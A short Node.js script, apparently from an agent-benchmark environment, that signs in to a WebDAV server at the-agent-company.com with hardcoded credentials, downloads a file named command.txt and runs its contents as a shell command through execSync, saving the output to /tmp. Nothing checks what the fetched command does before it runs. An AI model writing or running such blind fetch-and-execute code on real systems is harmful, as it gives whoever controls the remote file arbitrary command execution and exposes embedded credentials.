const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');

const options = {
  hostname: 'the-agent-company.com',
  port: 8092,
  path: '/remote.php/dav/files/theagentcompany/Documents/command.txt',
  method: 'GET',
  headers: {
    'Authorization': 'Basic ' + Buffer.from('theagentcompany:theagentcompany').toString('base64')
  }
};

const req = http.request(options, (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {
    fs.writeFileSync('/tmp/command.txt', data);
    fs.writeFileSync('/tmp/command_contents.txt', data);
    console.log('Contents:', data);
    try {
      const result = execSync(data.trim(), { encoding: 'utf8' });
      fs.writeFileSync('/tmp/command_output.txt', result);
      console.log('Output:', result);
    } catch(e) {
      fs.writeFileSync('/tmp/command_output.txt', e.message + '\n' + e.stdout + '\n' + e.stderr);
      console.log('Error:', e.message);
    }
  });
});
req.on('error', (e) => { fs.writeFileSync('/tmp/command_error.txt', e.message); });
req.end();

